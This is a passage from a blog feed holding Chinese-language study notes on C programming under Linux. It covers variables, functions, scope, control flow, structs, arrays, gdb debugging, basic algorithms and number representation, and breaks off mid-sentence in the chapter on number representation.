    
    
  </entry>
  
  
  
  <entry>
    <title>Learn C in Linux</title>
    <link href="/2022/09/12/CinLinux/"/>
    <url>/2022/09/12/CinLinux/</url>
    
    <content type="html"><![CDATA[<h1 id="琐碎知识点"><a href="#琐碎知识点" class="headerlink" title="琐碎知识点"></a>琐碎知识点</h1><p>printf 分成多行写, 用 <code>\</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">printf</span>(<span class="hljs-comment">&quot;Hello \</span><br>    World<span class="hljs-comment">&quot;);</span><br></code></pre></td></tr></table></figure><h1 id="第二章-常量-变量和表达式"><a href="#第二章-常量-变量和表达式" class="headerlink" title="第二章 常量, 变量和表达式"></a>第二章 常量, 变量和表达式</h1><h2 id="2-2-常量"><a href="#2-2-常量" class="headerlink" title="2.2 常量"></a>2.2 常量</h2><p>转换说明 (Conversion Specification) 又被称为占位符 (placeholder). </p><h2 id="2-3-变量"><a href="#2-3-变量" class="headerlink" title="2.3 变量"></a>2.3 变量</h2><p>变量是计算机存储器中的一块命名的空间, 可以在里面存储一个值, 存储的值是可以随时变化的, 所以才叫做变量.</p><p>声明 (declaration) 和定义 (definition) 的区别:</p><ul><li>定义是声明的子集, 如果一个声明要求编译器为它分配存储空间, 那么也可以叫做定义.</li></ul><p>函数名, 宏定义, 结构体成员等, 在 C 语言中这些都被统称为标识符.</p><p>关键词 (keyword) 和保留字 (reserved word) 是相同的含义.</p><p>一般来说应避免使用以下划线开头的标识符.</p><h2 id="2-4-赋值"><a href="#2-4-赋值" class="headerlink" title="2.4 赋值"></a>2.4 赋值</h2><p>变量声明中的类型表明这个变量代表多大的存储空间.</p><p>初始化是一种特殊的声明, 而不是一种赋值语句.</p><h2 id="2-5-表达式"><a href="#2-5-表达式" class="headerlink" title="2.5 表达式"></a>2.5 表达式</h2><p>任何表达式都有值和类型两个基本属性.</p><p>如果一个操作数的左右两侧各有一个相同优先级的运算符, 这个操作符和左边的运算符结合还是和右边的运算符结合取决于运算符的结合性 (Associativity), 相同优先级的运算符具有相同的结合性.</p><p>向下取整的运算称 Floor, 向上取整的运算称 Ceiling.</p><p>char 型本质上就是整数, 只不过取值范围比 int 小.</p><p>字符也可以用 ASCII 码转义序列表示, 这种转义序列由 <code>\</code> 加上 1<del>3 个八进制数字组成, 或者由 <code>\x</code> 或 <code>\X</code> 加上 1</del>2 个十六进制数字组成, 如 <code>\11</code> 和 <code>\x9</code> 表示 Tab 字符.</p><h1 id="第3章-简单函数"><a href="#第3章-简单函数" class="headerlink" title="第3章 简单函数"></a>第3章 简单函数</h1><p>函数调用运算符 <code>()</code> 是一种后缀运算符.</p><p>头文件一般位于 <code>/usr/include</code> 目录下.</p><p>数学函数位于 <code>libm.so</code> 库文件中 (这些库文件通常位于 <code>/lib</code>) 目录下. gcc 的 <code>-lm</code> 选项告诉编译器, 我们程序中用到的数学函数要在这个库文件里面找.</p><p>很多库函数如 printf, 都位于 <code>libc.so</code> 库文件中, 使用 <code>libc.so</code> 中的库函数在编译时不需要加 <code>-lc</code> 选项, 这个选项为 gcc 的默认选项.</p><h2 id="C-标准库和-glibc"><a href="#C-标准库和-glibc" class="headerlink" title="C 标准库和 glibc"></a>C 标准库和 glibc</h2><p>见书.</p><p>glibc 提供一组头文件和一组库文件, 几乎所有 C 程序都依赖于 libc.so, 也有很多 C 程序依赖于其他库文件.</p><h2 id="3-2-自定义函数"><a href="#3-2-自定义函数" class="headerlink" title="3.2 自定义函数"></a>3.2 自定义函数</h2><p>main 函数的特殊之处在于执行程序时它自动被操作系统调用, 意思就是, 我们不需要单独再写一个 <code>main()</code> 来调用这个函数.</p><p>main 函数的返回值是给操作系统看的, 因为 main 函数是被操作系统调用的, 通常程序执行成功就返回 0 , 在执行过程中出错就返回一个非零值.</p><p>main 函数最标准的形式是 <code>int main(int argc, char argv[])</code></p><p>语法上规定没有返回值的函数调用表达式是 void 类型, 有一个 void 类型的值.</p><p>语义上规定 void 类型不能参与运算.</p><p>这种 <code>void threeline(void);</code> 声明了一个函数的名称, 参数类型和个数, 返回值类型的称为函数原型. 只有带函数体的声明才叫做定义.</p><p>函数原型会为编译器提供有用的信息, 编译器在翻译代码的过程中, 只有见到函数原型之后才知道这个函数的名称, 参数类型和返回值, 这样在函数调用时才知道如何生成指令.</p><p>没有函数声明时, 会有函数的隐式声明 (implicit declaration), 隐式声明的函数返回值类型都是 int.</p><p>C 语言规定了一种特殊的参数列表格式:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span></span><br></code></pre></td></tr></table></figure><p><code>...</code> 表示 0 个或任意多个参数, 这些参数的类型也可以是不确定的, 这被称作可变参数 (variable argument).</p><p>有时候我们把函数叫做接口 (interface), 调用函数就是使用这个接口, 使用接口的前提是必须和接口保持一致.</p><p>注意区分用户命令和系统管理命令, 用户命令通常位于 <code>/bin</code> 和 <code>/usr/bin</code> 目录下, 系统管理命令通常位于 <code>/sbin</code> 和 <code>/usr/sbin</code> 目录下. 一般用户可以执行用户命令, 而执行系统管理命令一般需要 root 权限.</p><h2 id="3-4-全局变量-局部变量和作用域"><a href="#3-4-全局变量-局部变量和作用域" class="headerlink" title="3.4 全局变量, 局部变量和作用域"></a>3.4 全局变量, 局部变量和作用域</h2><p>局部变量 (Local Variable) 在每次函数调用时分配存储空间, 在每次函数返回时释放存储空间.</p><p>全局变量 (Globle Variable), 定义在所有函数体之外, 它们在程序开始运行时分配存储空间, 在程序结束时释放存储空间.</p><p>要注意, 局部变量可以用类型相符的任意表达式来初始化, 而全局变量只能用常量表达式 (Constant Expression) 来初始化.</p><p>程序在开始运行时要用适当的值来初始化全局变量, 所以初始值必须保存在编译生成的可执行文件中, 因此初始值在编译时就要计算出来.</p><p>全局变量在定义时不被初始化则其初始值是 0, 如果局部变量在定义时不初始化则其初始值是不确定的.</p><p>写非定义的函数声明时参数可以只写类型而不起名, 如 <code>void print_time(int, int)</code> 只要告诉编译器参数类型是什么, 编译器就能为 <code>print_time(23, 59)</code> 函数调用生成正确的指令.</p><p>在一个函数中可以声明另一个函数, 但不能定义另一个函数.</p><h1 id="第4章-分支语句"><a href="#第4章-分支语句" class="headerlink" title="第4章 分支语句"></a>第4章 分支语句</h1><h2 id="4-2-if-x2F-else-语句"><a href="#4-2-if-x2F-else-语句" class="headerlink" title="4.2 if&#x2F;else 语句"></a>4.2 if&#x2F;else 语句</h2><p>在 C 语言中, 任何允许出现语句的地方, 既可以是由分号结尾的一条语句, 也可以是由 <code>&#123;&#125;</code> 扩起来的若干条语句或声明组成的语句块 (Statement Block).</p><p>每一个 Statement Block 中都是一个局部作用域, 如:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    &#123;<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;<br>    &#125;    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, i);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就会报错.</p><p>C 语言规定, <code>%</code> 运算符的两个操作数必须是整型.</p><p><code>%</code> 运算符的结果总是与被除数同号, 即 <code>a%b</code> 中的 a.</p><p>浮点值的精度有限, 不适合用 <code>==</code> 运算符做精确比较.</p><h2 id="4-3-布尔代数"><a href="#4-3-布尔代数" class="headerlink" title="4.3 布尔代数"></a>4.3 布尔代数</h2><p>逻辑运算的数学体系称为布尔代数 (Boolean Algebra). 在编程语言中表示真和假的数据类型叫布尔类型, 在 C 语言中通常用 int 型表示.</p><h2 id="4-4-switch-语句"><a href="#4-4-switch-语句" class="headerlink" title="4.4 switch 语句"></a>4.4 switch 语句</h2><p>注意几点:</p><ul><li>case 后面的表达式必须是常量表达式, 这个值和全局变量一样必须在编译时计算出来</li><li>浮点型不适合做精确比较, 因此 case 后面必须为整型常量表达式. </li><li>进入 case 如果没有遇到 break 语句就会一直往下执行.</li></ul><p>有时候编译器会对 switch 语句进行整体的优化, 使它比等价的 if&#x2F;else 语句生成的指令效率更高.</p><h1 id="第5章-深入理解函数"><a href="#第5章-深入理解函数" class="headerlink" title="第5章 深入理解函数"></a>第5章 深入理解函数</h1><h2 id="5-1-return-语句"><a href="#5-1-return-语句" class="headerlink" title="5.1 return 语句"></a>5.1 return 语句</h2><p>在没有返回值的函数中也能使用 return 语句.</p><p>在有返回值的函数中, returm 语句的作用是提供整个函数的返回值, 结束当前函数并返回到调用它的地方.</p><p>返回布尔值的函数是一类非常有用的函数, 在程序中充当控制表达式, 函数名通常带有 if 或 is 等表示判断的词, 这类函数也叫做谓词 (Predicate). </p><p>函数的返回值应该这样理解: 函数返回一个值相当于定义一个与返回值类型相同的临时变量并用 return 后面的表达式来初始化.</p><p>虽然函数的返回值可以看作临时变量, 但我们只是读一下它的值, 读完值就释放它.</p><h2 id="5-3-递归"><a href="#5-3-递归" class="headerlink" title="5.3 递归"></a>5.3 递归</h2><p>如果定义一个概念需要用到这个概念本身, 我们称它的定义是递归的 (Recursive).</p><p>最关键的是需要定义一个基础条件 (Base Case).</p><p>堆栈或栈 (stack) 中, 随着函数调用和返回不断变化的这一端称为栈顶, 每个函数调用的参数和局部变量的存储空间称为一个栈帧 (Stack Frame). 操作系统为程序的运行预留了一块栈空间, 函数调用时就在这个栈空间内分配栈帧, 函数返回时就释放栈帧.</p><p>用数学归纳法 (Mathematical Induction) 来证明只需要证明两点: Base Case 正确和递推关系正确.</p><p>操作系统为程序预留的栈空间耗尽导致程序崩溃即 <mark>段错误</mark>.</p><h1 id="第6章-循环语句"><a href="#第6章-循环语句" class="headerlink" title="第6章 循环语句"></a>第6章 循环语句</h1><p> C 语言规定, 如果控制表达式 2 为空, 则认为控制表达式 2 的值为真:<br> <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">控制表达式 <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>while (控制表达式 <span class="hljs-number">2</span>) &#123;<br>   语句<br>   控制表达式 <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure></p><p> <code>i++</code> 和 <code>++i</code> 的区别在于返回值不同.</p><p> 编译的过程分为词法解析和语法解析两个阶段, 在词法解析阶段, 编译器总是从前到后找到最长的合法 token.</p><p> C99 规定一种新的 for 循环语法:<br> <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">for</span><span class="hljs-params">(int i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++ )</span></span><br></code></pre></td></tr></table></figure><br>编译时 gcc 需要加上 <code>-std=c99</code> 选项. </p><p>事实上, <code>default</code> 和 <code>case</code> 语句都是特殊的标号.</p><h1 id="第7章-结构体"><a href="#第7章-结构体" class="headerlink" title="第7章 结构体"></a>第7章 结构体</h1><p>类型定义也是一种声明, 声明都要以 <code>;</code> 结尾. 如:</p><figure class="highlight thrift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs thrift"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">complex_struct</span> </span>&#123;<br>    <span class="hljs-type">double</span> x, y;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里的 <code>comlex_struct</code> 为 tag.</p><p>若在定义结构体类型的同时定义了变量, 也可以不用写 tag:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">double</span> x, y;<br>&#125; z1, z2;<br></code></pre></td></tr></table></figure><p>这两个成员的存储空间是相邻的.</p><p>结构体变量也可以在定义时初始化:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">struct</span> complex_struct z = &#123; <span class="hljs-number">3</span>.<span class="hljs-number">0</span>, <span class="hljs-number">4</span>.<span class="hljs-number">0</span> &#125;;<br></code></pre></td></tr></table></figure><p>Initializer 中数据不够则初始化为 0.</p><p><code>&#123;&#125;</code> 这种语法不能用于结构体的赋值, 一下语句为错误:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">struct</span> complex_struct z1;<br><span class="hljs-attribute">z1</span> = &#123; <span class="hljs-number">3</span>.<span class="hljs-number">0</span>, <span class="hljs-number">4</span>.<span class="hljs-number">0</span> &#125;<br></code></pre></td></tr></table></figure><p>Designated Initializer 的语法:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">struct complex_struct z1 <span class="hljs-operator">=</span> &#123; .y <span class="hljs-operator">=</span> <span class="hljs-number">4.0</span> &#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>结构体类型在表达式中有很多限制, 不像基本类型那么自由.</p><p>结构体变量之间可以相互赋值和初始化, 也可以当作函数的参数和返回值来传递.</p><h2 id="7-3-数据类型标志"><a href="#7-3-数据类型标志" class="headerlink" title="7.3 数据类型标志"></a>7.3 数据类型标志</h2><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">enum</span> coordinate_<span class="hljs-keyword">type</span> = &#123; <span class="hljs-type">RECTANGULAR</span>, <span class="hljs-type">POLAR</span> &#125;;<br></code></pre></td></tr></table></figure><p>这里 enum 把 <code>coordinate_type</code> 声明为一个 tag, 其为枚举 (Enumeration) 类型, 默认从 0 开始分配.</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">enum</span> coordinate_<span class="hljs-keyword">type</span> = &#123; <span class="hljs-type">RECTANGULAR</span> = 1, <span class="hljs-type">POLAR</span> &#125;;<br></code></pre></td></tr></table></figure><p>这样就从 1 开始分配.</p><p>结构体的成员名和变量名不在同一命名空间, 枚举的成员名和变量名在同一命名空间中.</p><h1 id="第8章-数组"><a href="#第8章-数组" class="headerlink" title="第8章 数组"></a>第8章 数组</h1><p>数组中元素的存储空间也是相邻的.</p><figure class="highlight thrift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs thrift"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">complex_struct</span> </span>&#123;<br>    <span class="hljs-type">double</span> x, y;<br>&#125; a[<span class="hljs-number">4</span>];<br></code></pre></td></tr></table></figure><p>C99 的新特性允许在数组长度表达式中使用变量, 称为变长数组 (Variable Length Array), VLA 只能定义局部变量而不能是全局变量.</p><p>在 C 语言中, 后缀运算符的优先级最高, 单目运算符的优先级其次, 比其他运算符的优先级都高.</p><p>应避免数组越界问题.</p><p>数组也可以像结构体那样初始化, 未赋初值的元素也是用 0 来初始化.</p><p>如果定义数组时就将其初始化, 可以不用指定长度:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span> count[] = &#123; <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span> &#125;;<br></code></pre></td></tr></table></figure><p>利用 C99 的新特性也可以做 Memberwise Initialization:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int count[<span class="hljs-number">4</span>] <span class="hljs-operator">=</span> &#123; [<span class="hljs-number">2</span>] <span class="hljs-operator">=</span> <span class="hljs-number">3</span> &#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>数组不能相互赋值或初始化.</p><p>对于数组类型有一条特殊规则: 数组类型做右值使用时, 自动转换成指向数组首元素的指针.</p><p>因此, 如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span> a[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span> &#125;;<br><span class="hljs-attribute">int</span> b[<span class="hljs-number">5</span>];<br><span class="hljs-attribute">b</span> = a;<br></code></pre></td></tr></table></figure><p>这样写是错误的, 右边的 a 此时是指针类型, 而左边的 b 为数组类型.</p><h2 id="8-2-数组应用实例-统计随机数"><a href="#8-2-数组应用实例-统计随机数" class="headerlink" title="8.2 数组应用实例: 统计随机数"></a>8.2 数组应用实例: 统计随机数</h2><p>C 标准库中生成伪随机数的是 rand 函数, 需包含 <code>stdlib.h</code> 头文件, 其没有参数, 返回值是一个介于 0 和 RAND_MAX 之间的接近均匀分布的整数. RAND_MAX 是该头文件中定义的一个常量.</p><p>实际上编译器的工作分为两个阶段, 先是预处理 (preprocess) 阶段, 然后才是编译阶段, 用 gcc 的 -E 选项可以看到预处理之后, 编译之前的程序. 使用 cpp (C Preprocessor) 也可以达到同样的效果, 只做预处理不编译.</p><p>虽然 include 和 define 在预处理指示中有特殊含义, 但它们并不是 C 语言的关键词.</p><h2 id="8-3-数组应用实例-直方图"><a href="#8-3-数组应用实例-直方图" class="headerlink" title="8.3 数组应用实例: 直方图"></a>8.3 数组应用实例: 直方图</h2><p>C 标准库允许我们指定一个初值, 然后在此基础上生成伪随机数, 这个初值称为 Seed, 可以用 srand 函数指定 seed, 通常调用 time 函数得到当前系统时间距 1970-1-1-00:00:00 的秒数, 然后传给 srand:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">srand</span>(<span class="hljs-title"><span class="hljs-built_in">time</span></span>(<span class="hljs-variable"><span class="hljs-literal">NULL</span></span>));</span><br></code></pre></td></tr></table></figure><p>调用 time 需要包含 time.h 头文件, NULL 是空指针.</p><h2 id="8-4-字符串"><a href="#8-4-字符串" class="headerlink" title="8.4 字符串"></a>8.4 字符串</h2><p>字符串字面值也可以像数组名一样使用, 可以加下标访问其中的字符:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">char c <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello World\n&quot;</span>[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>通过下标修改其字符是不允许的. 但是传给数组后还是可以修改数组的内容的.</p><p>字符串字面值做右值时也会自动转换成指向首元素的指针.</p><p><code>printf(&quot;Hello World&quot;)</code> 其实就是传一个指针给 printf 函数.</p><p>如果要用一个字符串字面值准确地初始化一个字符数组, 最好的办法是不指定数组的长度, 让编译器自己计算:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">char str[] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello World.\n&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="8-5-多维数组"><a href="#8-5-多维数组" class="headerlink" title="8.5 多维数组"></a>8.5 多维数组</h2><p>从物理模型看, 多维数组中的元素在存储器中仍然是连续存储的.</p><p>多维数组中, 除了第一维的长度可以由编译器自动计算而不需要指定, 其余各维都必须明确指定长度.</p><h1 id="第9章-编码风格"><a href="#第9章-编码风格" class="headerlink" title="第9章 编码风格"></a>第9章 编码风格</h1><h2 id="9-2-注释"><a href="#9-2-注释" class="headerlink" title="9.2 注释"></a>9.2 注释</h2><p>注释的使用场合:</p><ul><li>整个源文件的顶部注释, 说明次模块的相关信息, 例如文件名, 作者和版本历史等</li><li>函数注释, 说明此函数的功能, 参数, 返回值, 错误码等, 写在函数定义上侧且不留空行.</li><li>相对独立的语句组注释.</li><li>代码行右侧的简短注释, 一个源文件中所有右侧代码注释最好能上下对齐.</li><li>复杂的结构体定义.</li><li>复杂的宏定义和变量声明.</li></ul><h2 id="9-5-indent-工具"><a href="#9-5-indent-工具" class="headerlink" title="9.5 indent 工具"></a>9.5 indent 工具</h2><p>这是一个命令行工具, 用来调整缩进, 其会直接修改源文件:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">$ indent -kr -<span class="hljs-type">i8</span> main.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p><code>-kr</code> 选项是 K&amp;R 风格, <code>-i8</code> 表示缩进八个空格长度.</p><h1 id="第十章-gdb"><a href="#第十章-gdb" class="headerlink" title="第十章 gdb"></a>第十章 gdb</h1><p><code>-g</code> 选项的作用是在可执行文件中加入源代码的信息.</p><p><code>help</code> command, the output is the main type of a class of commands.</p><p><code>list</code> command 一次只列10行. 可以用函数名。</p><p>按回车键表示重复上一条命令。</p><p>在调试时也需要源文件。</p><p><code>#0</code>, <code>#1</code> 是栈帧编号。</p><p>未初始化的变量具有不确定的值。</p><p><code>$1</code> 保存着gdb中的中间结果。</p><p>可以在 gdb 中修改变量的值 <code>set</code>.</p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><ul><li>backtrace(bt)</li><li>finish</li><li>frame(f)</li><li>info(i) locals</li><li>list(l)</li><li>list 行号</li><li>list 函数名</li><li>next(n)</li><li>print(p)</li><li>quit(q)</li><li>set var</li><li>start</li><li>step(s)</li></ul><h2 id="10-2-断点"><a href="#10-2-断点" class="headerlink" title="10.2 断点"></a>10.2 断点</h2><p>字符型的 ‘2’ 要减去 ‘0’ 的 ASCII 码才能转换成整数值 2.</p><p>display 命令可以跟踪显示. undisplay 取消跟踪显示.</p><p>设置断点的命令 break 和 continue 结合起来用, continue 命令就是连续运行, 知道遇到一个断点.</p><p>使用 info 命令可以查看已经设置的断点:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">info</span> breakpoints<br></code></pre></td></tr></table></figure><p>delete 命令加上编号可以删除某个断点.</p><p>可以用 disable 命令禁用断点而不是删除. enable 开始启用.</p><p>可以设置断点在满足某个条件时才激活:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">break</span> <span class="hljs-number">9</span> if sum != <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>使用 run 命令从程序开头连续运行.</p><p>字符串的长度是不包括 ‘\0’ 的.</p><h2 id="10-3-观察点"><a href="#10-3-观察点" class="headerlink" title="10.3 观察点"></a>10.3 观察点</h2><p>x 命令打印指定存储单元的内容:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">(gdb) x/<span class="hljs-number">7</span>b <span class="hljs-selector-tag">input</span><br></code></pre></td></tr></table></figure><p>这里的 <code>7b</code> 是打印格式, <code>7</code> 指打印 7 组, <code>b</code> 表示每个字节一组, 这里即从 input 数组的第一个字节开始连续打印 7 个字节. 打印的是十六进制的 ASCII 码.</p><p>断点是当程序执行到某一行代码时中断, 而观察点 (Watchpoint) 是当程序访问某个存储单元时中断.</p><p>用 watch 命令来设置观察点:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">(gdb) watch <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[5]</span><br></code></pre></td></tr></table></figure><p>可以用 info 命令查看:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(gdb) <span class="hljs-built_in">info</span> watchpoints<br></code></pre></td></tr></table></figure><h2 id="10-4-段错误"><a href="#10-4-段错误" class="headerlink" title="10.4 段错误"></a>10.4 段错误</h2><p>如果程序运行时出现段错误, 用 gdb 可以很容易定位到究竟是哪一行引发的段错误.</p><p>在 gdb 中运行, 遇到段错误会自动停下来, 这时可以用命令查看当前执行到哪一行代码了, 可以使用 bt (backtrace) 命令.</p><p>如果某个函数的局部变量发生访问越界, 有可能并不立即产生段错误, 而是在函数返回时产生段错误.</p><h1 id="第11章-排序与查找"><a href="#第11章-排序与查找" class="headerlink" title="第11章 排序与查找"></a>第11章 排序与查找</h1><h2 id="11-1-算法的概念"><a href="#11-1-算法的概念" class="headerlink" title="11.1 算法的概念"></a>11.1 算法的概念</h2><p>算法  (Algorithm) 是将一组输入转化成一组输出的一系列计算步骤, 其中每个步骤必须能在有限时间内完成.</p><p>算法使用来解决一类问题的.</p><p>推荐书籍:</p><ul><li>&lt;&lt; The Art of Computer Programming &gt;&gt;</li><li>&lt;&lt; Introduction to Algorithms &gt;&gt;</li></ul><h2 id="11-2-插入排序"><a href="#11-2-插入排序" class="headerlink" title="11.2 插入排序"></a>11.2 插入排序</h2><p>假如某个判断条件满足以下三条准则, 就将其称为 Loop Invariant:</p><ul><li>第一次执行循环体之前该判断为真</li><li>如果 “第 N-1 次循环之后 (或者说 N 次循环之前) 该判断条件为真” 这个前提可以成立, 那么就有办法证明第 N 次循环之后该判断条件仍为真</li><li>如果在所有循环结束后该判断条件为真, 那么就有办法证明该算法正确地解决了问题</li></ul><h2 id="11-3-算法的时间复杂度分析"><a href="#11-3-算法的时间复杂度分析" class="headerlink" title="11.3 算法的时间复杂度分析"></a>11.3 算法的时间复杂度分析</h2><p>在分析算法的时间复杂度时, 我们更关心最坏情况而不是最好情况.</p><p>我们用一种跟粗略的方式表示算法的时间复杂度, 把系数和低次幂都省去, 线性函数记作 O(n), 二次函数记作 $O(n^2)$.</p><h2 id="11-4-归并排序"><a href="#11-4-归并排序" class="headerlink" title="11.4 归并排序"></a>11.4 归并排序</h2><h1 id="第12章-栈与队列"><a href="#第12章-栈与队列" class="headerlink" title="第12章 栈与队列"></a>第12章 栈与队列</h1><h2 id="12-1-数据结构的概念"><a href="#12-1-数据结构的概念" class="headerlink" title="12.1 数据结构的概念"></a>12.1 数据结构的概念</h2><p>数据结构 (Data Structure) 是数据的组织方式.</p><p>数据的组织方式包含了存储方式和访问方式这两层意思, 二者是紧密联系的.</p><p>一个问题中数据的存储方式和访问方式决定了解决问题可以采用什么样的算法, 要设计一个算法就要同时设计相应的数据结构来支持这种算法.</p><p>算法 + 数据结构 &#x3D; 程序</p><h2 id="12-2-堆栈"><a href="#12-2-堆栈" class="headerlink" title="12.2 堆栈"></a>12.2 堆栈</h2><h2 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h2><h2 id="12-4-队列与广度优先搜索"><a href="#12-4-队列与广度优先搜索" class="headerlink" title="12.4 队列与广度优先搜索"></a>12.4 队列与广度优先搜索</h2><p>队列也是一组元素的集合, 它提供两种基本操作:</p><ul><li>Enqueue (入队), 将元素添加到队尾</li><li>Dequeue (出队), 从队头取出元素并返回</li></ul><p>FIFO, First In First Out.</p><h1 id="第13章-计算机中数的表示"><a href="#第13章-计算机中数的表示" class="headerlink" title="第13章 计算机中数的表示"></a>第13章 计算机中数的表示</h1><p>任何复杂的加减乘除运算都可以分解成简单的逻辑运算.</p><p>异或 (XOR, eXclusive OR) 运算, 即两个操作数相同则结果为 0, 两个操作数不同则结果为 1.</p><p>最高位 (Most Significant Bit, MSB).</p><p>最低位 (Least Significant Bit, LSB).</p><p>除二反序取余法, 用于将十进制转换为二进制.</p><h2 id="13-3-整数的加减运算"><a href="#13-3-整数的加减运算" class="headerlink" title="13.3 整数的加减运算"></a>13.3 整数的加减运算</h2><p>判断一个数的正负都是看最高位.</p><p>表示法的不同只是计算规则不同.</p><h3 id="13-3-1-Sign-and-Magnitude-表示法"><a href="#13-3-1-Sign-and-Magnitude-表示法" class="headerlink" title="13.3.1 Sign and Magnitude 表示法"></a>13.3.1 Sign and Magnitude 表示法</h3><p>把最高位规定为符号位 (Sign Bit), 0 表示正 1 表示负.</p><p>计算机做加法运算需要处理的逻辑:</p><ul><li>如果两数符号位相同, 就把他们的低七位相加</li><li>如果两数符号位不同, 首先比较它们的低七位谁大, 然后用大数减小数, 结果的符号位和大数相同</li></ul><h3 id="13-3-2-1’s-Complement-表示法"><a href="#13-3-2-1’s-Complement-表示法" class="headerlink" title="13.3.2 1’s Complement 表示法"></a>13.3.2 1’s Complement 表示法</h3><p>负数用 1 的补码 (1’s Complement) 表示, 减法转换成加法, 